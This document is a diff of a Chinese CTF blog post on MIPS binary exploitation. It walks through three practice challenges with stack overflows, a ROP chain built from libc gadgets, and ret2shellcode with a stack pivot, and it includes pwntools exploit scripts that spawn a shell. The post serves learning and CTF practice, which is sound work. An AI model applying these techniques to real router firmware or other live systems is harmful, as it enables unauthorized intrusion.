@@ -17,7 +17,9 @@ if (isPassword) {
     noSupport: '浏览器不支持'
   }
 }</script><meta name="generator" content="Hexo 4.1.1"><link rel="alternate" href="/LawlietLW.github.io/atom.xml" title="Lock's blog" type="application/atom+xml">
-<link rel="stylesheet" href="/LawlietLW.github.io/css/prism-tomorrow.css" type="text/css"></head><body><canvas id="universe"></canvas><!--#body--><div id="sidebar"><div class="toggle-sidebar-info button-hover"><span data-toggle="文章目录">站点概览</span></div><div class="sidebar-toc"><div class="sidebar-toc-title">目录</div><div class="sidebar-toc-progress"><span class="progress-notice">您已阅读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc-progress-bar"></div></div><div class="sidebar-toc-content" id="sidebar-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x1-rootme-ELF-MIPS-Stack-buffer-overflow-No-NX"><span class="toc-number">1.</span> <span class="toc-text">0x1.rootme-ELF MIPS - Stack buffer overflow - No NX</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x2-rootme-ELF-MIPS-Basic-ROP"><span class="toc-number">2.</span> <span class="toc-text">0x2.rootme-ELF MIPS - Basic ROP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x3-xmctf-top-mipspwn"><span class="toc-number">3.</span> <span class="toc-text">0x3.xmctf.top-mipspwn</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info-avatar"><img class="author-info-avatar-img" src="/avatar.png"></div><div class="author-info-name">Lock</div><div class="author-info-description"></div><div class="links-buttons"><a class="links-button button-hover" href="mailto:2499086884@qq.com" target="_blank">E-Mail<i class="icon-dot bg-color4"></i></a></div><div class="author-info-articles"><a class="author-info-articles-archives article-meta" href="/LawlietLW.github.io/archives"><span class="pull-top">日志</span><span class="pull-bottom">32</span></a><a class="author-info-articles-tags article-meta" href="/LawlietLW.github.io/tags"><span class="pull-top">标签</span><span class="pull-bottom">40</span></a><a class="author-info-articles-categories article-meta" href="/LawlietLW.github.io/categories"><span class="pull-top">分类</span><span class="pull-bottom">5</span></a></div><div class="friend-link"><a class="friend-link-text" href="https://buuoj.cn/" target="_blank">友链1:BUUCTF，有刷不完的题~</a></div></div></div><div id="main-container"><header><div id="menu-outer"><i class="menu-list-icon fas fa-bars"></i><nav id="menu-inner"><a class="menu-item" href="/">首页</a><a class="menu-item" href="/tags">标签</a><a class="menu-item" href="/categories">分类</a><a class="menu-item" href="/archives">归档</a><a class="menu-item" href="/about">关于</a></nav><div class="right-info"><a class="title-name" href="/LawlietLW.github.io/">Lock's blog</a><span id="now-time"></span></div></div></header><div id="content-outer"><div id="content-inner"><article id="post"><div class="post-header"><div class="title">MIPS PWN学习</div><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 发表于 2020-08-04 | 更新于 2020-08-05</time><!--time.button-hover.post-date #[i.fas.fa-calendar-alt.article-icon(aria-hidden="true")] #[=__('post.modified')] #[=date(page['updated'], config.date_format)]--><div class="button-hover categories"><i class="fa fa-inbox article-icon" aria-hidden="true"></i><a class="link-a" href="/LawlietLW.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/">二进制</a></div><div class="button-hover tags"><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/LawlietLW.github.io/tags/MIPS/">MIPS</a></div></div></div><div class="main-content"><p>​        MIPS架构常用于路由器设备，而路由器固件漏洞大部分都是栈溢出，因此，掌握MIPS架构下的漏洞利用对于挖掘利用路由器漏洞也是很重要的一项技能。</p>
+<link rel="stylesheet" href="/LawlietLW.github.io/css/prism-tomorrow.css" type="text/css"></head><body><canvas id="universe"></canvas><!--#body--><div id="sidebar"><div class="toggle-sidebar-info button-hover"><span data-toggle="文章目录">站点概览</span></div><div class="sidebar-toc"><div class="sidebar-toc-title">目录</div><div class="sidebar-toc-progress"><span class="progress-notice">您已阅读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc-progress-bar"></div></div><div class="sidebar-toc-content" id="sidebar-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x1-rootme-ELF-MIPS-Stack-buffer-overflow-No-NX"><span class="toc-number">1.</span> <span class="toc-text">0x1.rootme-ELF MIPS - Stack buffer overflow - No NX</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x2-rootme-ELF-MIPS-Basic-ROP"><span class="toc-number">2.</span> <span class="toc-text">0x2.rootme-ELF MIPS - Basic ROP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x3-xmctf-top-mipspwn"><span class="toc-number">3.</span> <span class="toc-text">0x3.xmctf.top-mipspwn</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info-avatar"><img class="author-info-avatar-img" src="/avatar.png"></div><div class="author-info-name">Lock</div><div class="author-info-description"></div><div class="links-buttons"><a class="links-button button-hover" href="mailto:2499086884@qq.com" target="_blank">E-Mail<i class="icon-dot bg-color5"></i></a></div><div class="author-info-articles"><a class="author-info-articles-archives article-meta" href="/LawlietLW.github.io/archives"><span class="pull-top">日志</span><span class="pull-bottom">32</span></a><a class="author-info-articles-tags article-meta" href="/LawlietLW.github.io/tags"><span class="pull-top">标签</span><span class="pull-bottom">40</span></a><a class="author-info-articles-categories article-meta" href="/LawlietLW.github.io/categories"><span class="pull-top">分类</span><span class="pull-bottom">5</span></a></div><div class="friend-link"><a class="friend-link-text" href="https://buuoj.cn/" target="_blank">友链1:BUUCTF，有刷不完的题~</a></div></div></div><div id="main-container"><header><div id="menu-outer"><i class="menu-list-icon fas fa-bars"></i><nav id="menu-inner"><a class="menu-item" href="/">首页</a><a class="menu-item" href="/tags">标签</a><a class="menu-item" href="/categories">分类</a><a class="menu-item" href="/archives">归档</a><a class="menu-item" href="/about">关于</a></nav><div class="right-info"><a class="title-name" href="/LawlietLW.github.io/">Lock's blog</a><span id="now-time"></span></div></div></header><div id="content-outer"><div id="content-inner"><article id="post"><div class="post-header"><div class="title">MIPS PWN学习</div><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 发表于 2020-08-04 | 更新于 2020-08-31</time><!--time.button-hover.post-date #[i.fas.fa-calendar-alt.article-icon(aria-hidden="true")] #[=__('post.modified')] #[=date(page['updated'], config.date_format)]--><div class="button-hover categories"><i class="fa fa-inbox article-icon" aria-hidden="true"></i><a class="link-a" href="/LawlietLW.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/">二进制</a></div><div class="button-hover tags"><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/LawlietLW.github.io/tags/MIPS/">MIPS</a></div></div></div><div class="main-content"><p>​        MIPS架构常用于路由器设备，而路由器固件漏洞大部分都是栈溢出，因此，掌握MIPS架构下的漏洞利用对于挖掘利用路由器漏洞也是很重要的一项技能。</p>
+<a id="more"></a>
+
 <p>准备环境及工具：</p>
 <ul>
 <li><strong>Ubuntu16</strong>虚拟机(Ubuntu14或者Ubuntu18也可以，不过推荐使用Ubuntu16，我用18装环境遇到了很多奇奇怪怪的问题)</li>
@@ -84,12 +86,12 @@ hello:  .asciz  "Hello World\nWhat is your name: "
 hello_start:  .asciz  "Hello "
     hello_start_len =    . - hello_start</code></pre>
 <p>题目给的保护如下</p>
-<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/1.jpg" alt=""></p>
+<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/1.jpg" alt></p>
 <p>由于题目说的是MIPS，所以我们就按照大端序来编译</p>
 <p>用如下命令进行编译</p>
 <pre><code>mips-linux-gnu-as of.s -o of.o #编译成二进制目标文件
 mips-linux-gnu-ld of.o -o of #编译生成可执行文件</code></pre><p>然后我们运行一下，由于是静态编译，所以直接./of即可</p>
-<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/2.jpg" alt=""></p>
+<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/2.jpg" alt></p>
 <p>从汇编我们可以看到</p>
 <pre class=" language-assembly"><code class="language-assembly">subu    $sp, $sp, 0x18
 sw      $ra, 0x14($sp)</code></pre>
@@ -102,9 +104,9 @@ addiu   $a2, $zero, 0x80 #$a2保存第三个参数，0x80</code></pre>
 <p>存在很明显的栈溢出，而由于程序是由简短的汇编代码生成，所以基本上不存在可用的gadget，而由于远程没有开启<strong>ASLR</strong>，所以栈地址也不会发生变化，且程序没有<strong>NX</strong>保护，所以我们使用shellcode来进行利用</p>
 <p>由汇编代码我们可以知道offset为0x14，我们填充0x14个垃圾字符，然后将返回值覆盖为<strong>$sp+0x14+4</strong>，即存储返回地址的位置的后四字节，然后将$sp+0x14+4的值填充为shellcode，这样返回到$ra之后就会执行shellcode</p>
 <p>关闭本机上的aslr后动态调试，可以得到stack的地址</p>
-<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/3.jpg" alt=""></p>
+<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/3.jpg" alt></p>
 <p>不过在按照这个栈地址打不通，于是我动调了一下exp，发现此时的栈地址后三位为148，调试程序和调试exp时的栈地址相差0x10的大小</p>
-<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/4.jpg" alt=""></p>
+<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/4.jpg" alt></p>
 <p>修改之后便能打通了,最终exp如下</p>
 <pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>
 <span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
@@ -120,27 +122,27 @@ payload <span class="token operator">+=</span> shellcode
 io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'What is your name: '</span><span class="token punctuation">)</span>
 io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
 io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
-<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/5.jpg" alt=""></p>
+<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/5.jpg" alt></p>
 <p>(但不知道为什么远程就是打不通。。。)</p>
 <h2 id="0x2-rootme-ELF-MIPS-Basic-ROP"><a href="#0x2-rootme-ELF-MIPS-Basic-ROP" class="headerlink" title="0x2.rootme-ELF MIPS - Basic ROP"></a>0x2.rootme-ELF MIPS - Basic ROP</h2><p>程序保护如下</p>
-<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/6.jpg" alt=""></p>
+<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/6.jpg" alt></p>
 <p>连接ssh下载文件</p>
-<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/7.jpg" alt="">)(rootme的ssh连上去还挺好康的)</p>
+<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/7.jpg" alt>)(rootme的ssh连上去还挺好康的)</p>
 <p>虽然题目已经告诉了保护情况，但拿到题目我还是习惯先checksec一下</p>
-<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/8.jpg" alt=""></p>
+<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/8.jpg" alt></p>
 <p>32位大端序程序，而且之前ssh连上去之后就直接告诉我们了程序是动态编译的</p>
-<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/9.jpg" alt=""></p>
+<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/9.jpg" alt></p>
 <p>于是我们顺便把lib文件夹下载下来(由于ssh服务器在外网，所以我这里下载的挺慢的。。。)，文件夹中有两个文件，ld.so.1和libc.so.6</p>
 <p>但运行起来却出了意想不到的情况</p>
 <p>一般来说应该直接<strong>qemu-mips -L  ./  ./ch64</strong>就能运行起来，但这题却给我报了这么个错</p>
-<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/10.jpg" alt=""></p>
+<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/10.jpg" alt></p>
 <p>然而在ssh服务器上使用这条命令却能直接运行</p>
-<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/11.jpg" alt=""></p>
+<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/11.jpg" alt></p>
 <p>有点懵逼，遂谷歌报错信息，但并没有获得有用的信息，查看了一下ssh服务器上的qemu版本，为2.11.1，猜测是不是qemu版本不对，就下载了2.11.1，然而并没有什么🥚用，陷入沉思。之后又谷歌了一下，看到有类似报错的，直接使用-g进行调试，于是使用<strong>qemu-mips -L  ./ -g 1234 ./ch64</strong>启动调试，vmmap查看发现程序并未加载libc.6.so库,仅仅只加载了ld.so.1，于是便使用pwn题下加载不同libc的方法强制加载libc.so.6库</p>
 <pre class=" language-shell"><code class="language-shell">export LD_LIBRARY_PATH=`pwd`
 export LD_PRELOAD=lib/libc.so.6</code></pre>
 <p>然后运行</p>
-<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/12.jpg" alt=""></p>
+<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/12.jpg" alt></p>
 <p>成功！第一行的报错个人猜测是我强制加载了libc库，然后-L 又指定了一下libc，然后报错，当然这只是猜测，也懒得谷歌了</p>
 <p>接下来就开始利用</p>
 <p>首先将程序分别用IDA和Ghidra进行加载，用ghidra查看伪代码,main函数如下</p>
@@ -175,18 +177,18 @@ export LD_PRELOAD=lib/libc.so.6</code></pre>
 <span class="token function">fgets</span><span class="token punctuation">(</span>acStack136<span class="token punctuation">,</span><span class="token number">0x200</span><span class="token punctuation">,</span><span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
 <p>fgets接受0x200个字节的输入，而缓冲区大小只有128字节，当输入为<strong>$MyPasswordPoorlySecured!</strong>时就退出while循环</p>
 <p>我们动态调试一下来确定偏移量，使用cyclic 200生成200个字符，然后输入进去</p>
-<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/14.jpg" alt=""></p>
+<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/14.jpg" alt></p>
 <p>程序崩溃，然后确定偏移量</p>
-<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/15.jpg" alt=""></p>
+<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/15.jpg" alt></p>
 <p>offset=132,我们再来验证一下，我们使用cyclic生成132个字符再加上BBBB</p>
-<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/16.jpg" alt=""></p>
+<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/16.jpg" alt></p>
 <p>可以看到，返回地址确实被覆盖成了BBBB</p>
 <p>确定了返回地址，该怎么利用</p>
 <p>由于远程环境未开启ASLR且程序未开启PIE，所以libc加载地址是不变的，我们无需泄露libc地址，直接vmmap查看libc加载地址即可</p>
-<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/17.jpg" alt=""></p>
+<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/17.jpg" alt></p>
 <p>可以查看到libc基地址为<strong>0x76637000</strong></p>
 <p>然后我们要构造出system(‘/bin/sh’),有了libc基地址，system和binsh字符串的地址也知道了，接下来查找gadget，IDA加载libc.so.6，使用<strong>mipsrop.stackfinder()</strong>命令查找用于栈的gadgets</p>
-<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/18.jpg" alt=""></p>
+<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/18.jpg" alt></p>
 <p>我们需要控制$a0，用于存放binsh的地址，我们选择<strong>0x0012BAA4</strong>位置处的gadget来操作，如下</p>
 <pre class=" language-assembly"><code class="language-assembly">.text:0012BAA4                 move    $t9, $s0
 .text:0012BAA8                 jalr    $t9 ; pipe
@@ -207,14 +209,14 @@ export LD_PRELOAD=lib/libc.so.6</code></pre>
 .text:000AE844                 addiu   $sp, 0x40</code></pre>
 <p>利用这个gadget，我们可以将$s0设置为system函数的地址，将这个gadget执行完后的返回值设置为gadget_a0的地址，即在<strong>$sp+0x3c</strong>的位置处填入gadget_a0的地址，类似的我们称这个gadget为<strong>gadget_s0</strong></p>
 <p>于是，我们整个payload的结构图如下</p>
-<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/1.png" alt=""></p>
+<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/1.png" alt></p>
 <p>详细地解释一下这个流程，首先偏移量132，随后将返回地址覆盖为gadget_s0，然后由于这一句</p>
 <pre class=" language-assembly"><code class="language-assembly">lw      $s0, 0x40+var_24($sp)</code></pre>
 <p>将0x1c($sp)位置处的值写入$s0，所以$sp+0x1c处我们填充为system地址，而由于当程序执行gadget_s0时，gadget_s0就是sp所指向的位置，所以直接填充0x1c个垃圾字符后接上system地址即可，由于返回地址为</p>
 <pre class=" language-assembly"><code class="language-assembly">lw      $ra, 0x40+var_4($sp)</code></pre>
 <p>即相对于返回地址位置+0x3c处要填充为gadget_a0的地址，‘A’*0X1C+system(4字节)=0x20字节，所以在system后再填充(0x3c-0x20)个字节的垃圾字符，然后再填充gadget_a0的地址，再填充0x24个垃圾字节，最后写入binsh的地址</p>
 <p>不过这样子的exp写完会有点问题，发生在执行system(“/bin/sh”)的时候，如下</p>
-<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/21.jpg" alt=""></p>
+<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/21.jpg" alt></p>
 <p>也不想调试到底是哪里发生了问题，作为替代，我将binsh的地址直接替换为sh\x00\x00，然后就可以打通了，exp如下</p>
 <pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>
 <span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
@@ -254,12 +256,12 @@ io<span class="token punctuation">.</span>recvuntil<span class="token punctuatio
 io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'$MyPasswordPoorlySecured!'</span><span class="token punctuation">)</span>
 io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
 </code></pre>
-<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/22.jpg" alt=""></p>
+<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/22.jpg" alt></p>
 <h2 id="0x3-xmctf-top-mipspwn"><a href="#0x3-xmctf-top-mipspwn" class="headerlink" title="0x3.xmctf.top-mipspwn"></a>0x3.xmctf.top-mipspwn</h2><p>下载下来有两个libc文件和一个可执行文件，checksec检查一下</p>
-<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/23.jpg" alt=""></p>
+<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/23.jpg" alt></p>
 <p>32位小端序，无保护</p>
 <p>file一下</p>
-<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/24.jpg" alt=""></p>
+<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/24.jpg" alt></p>
 <p>静态编译，所以这个lib文件夹并没有什么用</p>
 <p>分别用ghidra和IDA加载题目，ghidra查看伪代码</p>
 <p>main函数和漏洞函数分别如下</p>
@@ -291,13 +293,13 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
 <span class="token punctuation">}</span></code></pre>
 <p>并没有什么🥚用，只是提供了一个system函数</p>
 <p>IDA使用mipsrop查找一下gadget</p>
-<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/27.jpg" alt=""></p>
+<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/27.jpg" alt></p>
 <p>虽然是静态编译，但可用的gadget非常少</p>
 <p>而用于栈的gadget只有一条，还是为$a1赋值</p>
-<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/28.jpg" alt=""></p>
+<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/28.jpg" alt></p>
 <p>所以我们得换个思路，gadget不足，不能用rop来getshell，但程序没有NX保护，所以我们便采用ret2shellcode来利用</p>
 <p>首先确定一下偏移量大小</p>
-<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/29.jpg" alt=""></p>
+<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/29.jpg" alt></p>
 <p>glibcpwn中，ret2shellcode有时会利用read函数往bss端读入shellcode然后跳转到bss段执行，这题的利用手法也类似，不过在这题中，我们并不能手动构造出read函数，而是借用vul函数中的read语句来执行，如下所示</p>
 <pre class=" language-assembly"><code class="language-assembly">.text:00400484                 li      $a2, 0xB0
 .text:00400488                 addiu   $v0, $fp, 0x58+var_40
@@ -347,7 +349,7 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
 <pre class=" language-assembly"><code class="language-assembly">addiu   $v0, $fp, 0x58+var_40</code></pre>
 <p>因为是将<strong>$fp+0x58-0x40</strong>赋给$v0,为避免计算，我们将$fp设置为<strong>bss+0x50-0x58+0x40</strong>,这样赋给$v0的就是<strong>(bss+0x50-0x58+0x40)+0x58-0x40=bss+0x50</strong>，随后sleep(1),等待rop执行，接着就会执行第二次read，往bss+0x50读，实际上这就是一个栈迁移，将栈迁移到了bss段，这次就只需要覆盖$ra，将$ra修改为shellcode的地址。第二次read从bss+0x50开始，然后写入60(0x3c)个A，返回地址占四字节，加起来就是0x40个字节，返回地址之后就是shellcode，所以将返回地址修改为<strong>bss+0x50+0x40</strong>就好</p>
 <p>执行效果如下</p>
-<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/30.jpg" alt=""></p>
+<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/30.jpg" alt></p>
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​        这三道题相信在做多了glibcpwn的师傅们看来都是基础题，需要注意的就是mips架构下的指令和寄存器的功能，以及叶子函数和非叶子函数的一点区别。不过在跟着《解密家用路由器0day漏洞挖掘技术》这本书进行一些路由器漏洞的复现时，发觉挺多路由器漏洞的利用难度也差不多是这个水平(当然也不能局限于这个难度，难题也还是有的)，路由器绝大部分无aslr，固件无保护，困难之处在于发现漏洞。当然也可能是因为我接触的少了，这本书上的几个漏洞也都是好几年前的了，现在的情况也应该有所变化。</p>
 <p>​        最后，希望本篇文章能为像我一样刚入门的师傅们提供一点帮助。</p>
 <p>参考链接：</p>
